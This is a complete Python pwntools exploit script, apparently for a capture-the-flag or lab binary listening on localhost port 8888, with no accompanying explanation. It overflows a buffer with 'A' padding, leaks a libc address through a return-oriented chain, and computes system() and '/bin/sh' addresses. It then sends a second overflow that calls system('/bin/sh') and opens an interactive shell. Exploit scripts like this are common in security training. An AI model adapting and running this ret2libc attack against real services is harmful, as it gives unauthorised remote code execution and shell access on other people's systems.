#!/usr/bin/env python

from pwn import *

r = remote('127.0.0.1', 8888)

r.send('A'*116 + 
    p32(0x08048420) + p32(0x804858d) + p32(0x804a018) + '\n')

base = u32(r.recvrepeat(1)[:4]) - 0x00065650

print hex(base)

system = base + 0x00040190 # system()
str_sh = base + 0x160A24 # /bin/sh


r.send('A'*124 + 
    p32(system) + p32(0) + p32(str_sh) + '\n')

r.interactive()
